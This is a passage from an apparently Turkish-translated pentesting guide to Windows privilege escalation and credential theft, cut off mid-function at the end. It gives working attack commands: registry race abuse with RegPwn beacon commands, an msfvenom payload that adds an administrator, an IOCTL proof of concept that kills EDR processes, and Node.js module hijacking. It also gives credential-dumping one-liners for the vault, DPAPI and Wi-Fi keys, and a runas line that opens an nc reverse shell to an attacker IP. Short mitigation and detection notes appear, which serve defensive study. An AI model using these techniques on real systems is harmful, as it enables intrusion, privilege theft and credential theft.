reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Keyfi HKLM değeri yazmak için registry symlink race (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** process'i tarafından bir HKLM session key'ine kopyalanan, kullanıcı başına **ATConfig** key'leri oluşturur. Bir registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM path**'ine yönlendirerek keyfi bir HKLM **value write** primitive'i sağlar.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı kontrollü configuration'ı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, logon/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** value'sunu doldurun.
2. Secure-desktop copy işlemini tetikleyin (ör. **LockWorkstation**); bu işlem AT broker flow'u başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirerek **race**'i kazanın; oplock tetiklendiğinde **HKLM Session ATConfig** key'ini, korumalı bir HKLM target'ına işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırgan tarafından seçilen value'yu yönlendirilmiş HKLM path'ine yazar.

Keyfi HKLM value write elde ettikten sonra, service configuration value'larını overwrite ederek LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabildiği bir service seçin (ör. **`msiserver`**) ve write işleminden sonra service'i tetikleyin. **Note:** public exploit implementation, race'in bir parçası olarak workstation'ı **locks**.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry'den alt registry'ler oluşturabilirsiniz** anlamına gelir. Windows services söz konusu olduğunda bu, **arbitrary code çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın path'i tırnak işaretleri içinde değilse Windows, boşluktan önceki her sonlandırmayı çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ path'i için Windows şunları çalıştırmayı deneyecektir:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, kullanıcıların bir service başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik, bir binary'yi gösterecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**binary'lerin izinlerini** kontrol edin (belki birini overwrite ederek privilege escalation gerçekleştirebilirsiniz) ve klasörlerin izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için herhangi bir config dosyasını değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak herhangi bir binary dosyayı değiştirip değiştiremeyeceğinizi (schedtasks) kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şunu çalıştırmaktır:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik olarak yükler. Yazılabilir bir portable/kopya kurulum mevcutsa, kötü amaçlı bir plugin yerleştirmek her başlatmada `notepad++.exe` içinde otomatik kod yürütme sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından yürütülecek bir registry girdisinin veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilgi çekici autorun konumları** hakkında daha fazla bilgi edinmek üzere **aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf garip/zafiyetli** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Bir driver, arbitrary kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), kernel memory'den doğrudan bir SYSTEM token çalarak privilege escalation gerçekleştirebilirsiniz. Adım adım tekniği burada bulabilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call'un attacker-controlled bir Object Manager path açtığı race-condition bug'larında, lookup işlemini kasıtlı olarak yavaşlatmak (max-length component'ler veya derin directory chain'leri kullanarak) window'u microsecond'lardan onlarca microsecond'a kadar uzatabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities, deterministic layout'lar hazırlamanıza, writable HKLM/HKU descendant'larını kötüye kullanmanıza ve metadata corruption'ını custom driver olmadan kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Tüm chain'i burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'a `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse `EntryContext`, developer'ın beklediği türe göre değil, **actual** registry type'a göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:

- **Confused deputy / oracle**: User-controlled absolute `\Registry\...` path, driver'ın attacker tarafından seçilen key'leri query etmesine, return code/log'lar üzerinden varlık bilgisini leak etmesine ve bazı durumlarda caller'ın doğrudan erişemeyeceği value'ları okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar destination, registry value type'a bağlı olarak type-confused biçimde `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış binary buffer olarak yorumlanır.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Query, `RTL_QUERY_REGISTRY_DIRECT` ile fakat `RTL_QUERY_REGISTRY_TYPECHECK` olmadan bir **untrusted hive**'a ulaşırsa kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile crash olur. Exploitability'yi korumak için value'ları `HKCU` altında staging etmek yerine **trusted system hive'lar içindeki attacker-writable key'leri** arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki writable descendant'ları enumerate etmek için NtObjectManager kullanın ve sandboxed context'lerden erişilebilen key'leri bulmak üzere taramayı duplicate edilmiş bir **low-integrity** token ile yeniden çalıştırın:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte bir `int` değerine yapılan 8-byte doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer değerinin kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext` değerinin bir `UNICODE_STRING` işaret etmesini bekler. Kod önce attacker-controlled bir `REG_DWORD` değerini stack üzerindeki bir scalar değişkene yükler ve ardından aynı buffer'ı string read için yeniden kullanırsa attacker, `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek semi-controlled bir kernel write elde eder.
- **`REG_BINARY`**: büyük binary data için direct mode, `EntryContext` adresindeki ilk `LONG` değerini signed buffer size olarak ele alır. Önceki bir `REG_DWORD` read, yeniden kullanılan scalar değişkende **negative** ve attacker-controlled bir değer bırakırsa sonraki `REG_BINARY` query, attacker bytes değerlerini doğrudan bitişik stack slot'larının üzerine kopyalar; bu da çoğu zaman callback-pointer overwrite işlemini tamamen kontrol etmenin en temiz yoludur.

Güçlü hunting pattern: **aynı stack variable içine, yeniden başlatmadan heterogeneous registry reads yapılması**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read işleminin ikinci read işleminin gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'leri için grep kullanın.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Bazı signed third-party driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN değerini ayarlamayı unutur. Bu flag olmadan, device extra bir component içeren bir path üzerinden açıldığında secure DACL enforce edilmez; böylece herhangi bir unprivileged user aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir case)

Bir user device'ı açabildiğinde, driver'ın sunduğu privileged IOCTL'lar LPE ve tampering için abuse edilebilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- Arbitrary process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser ile SYSTEM shell).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitrary process'leri terminate etme; bu sayede user land üzerinden kernel aracılığıyla AV/EDR kill gerçekleştirilebilir.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için Mitigations
- DACL ile kısıtlanması amaçlanan device objects oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Privileged operations için caller context'i doğrulayın. Process termination veya handle returns işlemlerine izin vermeden önce PP/PPL checks ekleyin.
- IOCTL'leri (access masks, METHOD_*, input validation) kısıtlayın ve doğrudan kernel privileges yerine brokered models kullanmayı değerlendirin.

Savunmacılar için Detection fikirleri
- Şüpheli device names'lere (ör. \\ .\\amsdk*) yönelik user-mode opens işlemlerini ve abuse göstergesi olan belirli IOCTL sequences'lerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny lists'inizi koruyun.


## PATH DLL Hijacking

Eğer **PATH üzerinde bulunan bir klasör içinde write permissions** varsa, bir process tarafından yüklenen DLL'i hijack edebilir ve **privileges escalate** edebilirsiniz.

PATH içindeki tüm klasörlerin permissions'larını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu check'in nasıl abuse edileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron module resolution hijacking

Bu, **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows uncontrolled search path** varyantıdır. Uygulamalar `require("foo")` gibi bir bare import gerçekleştirdiğinde ve beklenen module **missing** olduğunda ortaya çıkar.

Node, directory tree boyunca yukarı doğru ilerleyerek her parent içindeki `node_modules` klasörlerini kontrol ederek package'ları resolve eder. Windows'ta bu arama drive root'a kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları probe edebilir:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Eğer **low-privileged user**, `C:\node_modules` oluşturabiliyorsa kötü amaçlı bir `foo.js` (veya package folder) yerleştirebilir ve daha yüksek ayrıcalıklı bir **Node/Electron process**'in missing dependency'yi resolve etmesini bekleyebilir. Payload, victim process'in security context'i içinde çalışır. Bu nedenle hedef administrator olarak, elevated scheduled task/service wrapper içinden veya auto-started privileged desktop app olarak çalıştığında **LPE** meydana gelir.

Bu durum özellikle şu koşullarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlanmışsa
- bir third-party library `require("foo")` ifadesini `try/catch` ile wrap ediyor ve hata durumunda devam ediyorsa
- bir package production build'lerinden kaldırılmışsa, packaging sırasında atlanmışsa veya install edilememişse
- vulnerable `require()` ana application code içinde değil, dependency tree'nin derinlerinde bulunuyorsa

### Vulnerable target'ları araştırma

Resolution path'i kanıtlamak için **Procmon** kullanın:

- `Process Name` filtresini hedef executable'a (`node.exe`, Electron app EXE'si veya wrapper process) ayarlayın
- `Path` filtresini `contains` `node_modules` olacak şekilde ayarlayın
- `NAME NOT FOUND` ve `C:\node_modules` altındaki son başarılı open işlemlerine odaklanın

Unpacked `.asar` dosyalarında veya application source'larında kullanılabilecek yararlı code-review pattern'leri:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon veya source review üzerinden **missing package name** değerini belirleyin.
2. Henüz mevcut değilse root lookup directory oluşturun:
```powershell
mkdir C:\node_modules
```
3. Beklenen adla birebir eşleşen bir module bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Mağdur uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu kalıba uyan eksik isteğe bağlı modüllerin gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan kısım **technique**'dir: ayrıcalıklı bir Windows Node/Electron işleminin çözümleyeceği herhangi bir **missing bare import** bulun.

### Detection and hardening ideas

- Bir kullanıcının `C:\node_modules` oluşturması veya buraya yeni `.js` dosyaları/paketleri yazması durumunda uyarı oluşturun.
- Yüksek bütünlük düzeyine sahip işlemlerin `C:\node_modules\*` konumundan okuma yapıp yapmadığını araştırın.
- Production ortamındaki tüm runtime dependencies paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodunu sessiz `try { require("...") } catch {}` kalıpları açısından inceleyin.
- Library destekliyorsa optional probe'ları devre dışı bırakın (örneğin bazı `ws` kurulumları `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` probe'undan kaçınabilir).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **erişimi kısıtlanmış hizmetleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ enumeration için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

`root` kullanıcısını elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, `nc` uygulamasına firewall tarafından izin verilip verilmeyeceğini GUI üzerinden sorar).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` filesystem'ını `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, sunucular, web siteleri ve diğer programlar için **Windows'un kullanıcıların oturumunu otomatik olarak açmasını** sağlayan kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook kimlik bilgilerini, Twitter kimlik bilgilerini, Gmail kimlik bilgilerini vb. depolayabileceği ve böylece tarayıcılar üzerinden otomatik olarak oturum açabilecekleri anlamına geliyor gibi görünebilir. Ancak durum böyle değildir.

Windows Vault, Windows'un kullanıcıların oturumunu otomatik olarak açabileceği kimlik bilgilerini depolar. Bu, **bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** (sunucu veya web sitesi) **bu Credential Manager** ve Windows Vault'tan yararlanabileceği ve kullanıcıların her seferinde kullanıcı adı ile parolayı girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Bu nedenle uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan **bu kaynak için kimlik bilgilerini istemek üzere Credential Manager ile iletişim kurmalıdır**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary dosyasını çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
`mimikatz`, `lazagne`, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) üzerinden.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolalarını Universal Windows Platform (UWP) `PasswordVault` içinde depolar (`vaultcmd` içinde `Web Credentials` olarak da sunulur). Bu depolama alanı oturumdan izole edilmiştir ve yönetici veya `SeDebugPrivilege` yetkileri olmadan yerel olarak çözülebilir.

Tüm kayıtlı kullanıcı adlarını ve düz metin parolalarını anında dökmek ve şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumu içinde çalıştırın:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; v = New-Object Windows.Security.Credentials.PasswordVault; v.RetrieveAll() | ForEach-Object { try { \(_.RetrievePassword();\)_ } catch{} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Veri Koruma API'si (DPAPI)**, ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesi amacıyla kullanılan, verilerin simetrik şifrelenmesi için bir yöntem sağlar. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak üzere bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, anahtarların kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanır. **Kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'de `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password ile korunan kimlik bilgileri dosyaları** genellikle şu konumda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred` modülünü uygun `/masterkey` ile kullanarak şifre çözme işlemi yapabilirsiniz.\
`sekurlsa::dpapi` modülüyle **memory** üzerinden birçok DPAPI **masterkey** çıkarabilirsiniz (root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini pratik bir şekilde depolamak için genellikle **scripting** ve otomasyon görevlerinde kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu genellikle yalnızca oluşturuldukları bilgisayarda aynı user tarafından şifrelerinin çözülebileceği anlamına gelir.

Bir PS credential'ın bulunduğu file'dan şifresini çözmek için şunları yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Yakın Zamanda Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey` parametresini uygun şekilde kullanarak herhangi bir `.rdg` dosyasının şifresini çözmek için **Mimikatz** `dpapi::rdg` modülünü kullanın\
Mimikatz `sekurlsa::dpapi` modülü ile bellekten birçok DPAPI masterkey **çıkarabilirsiniz**

### Sticky Notes

Kullanıcılar, bunun bir veritabanı dosyası olduğunu fark etmeden, Windows iş istasyonlarında parolaları ve diğer bilgileri **kaydetmek** için sıklıkla StickyNotes uygulamasını kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalışmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **kimlik bilgilerinin** yapılandırılmış ve **kurtarılabilir** olması mümkündür.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
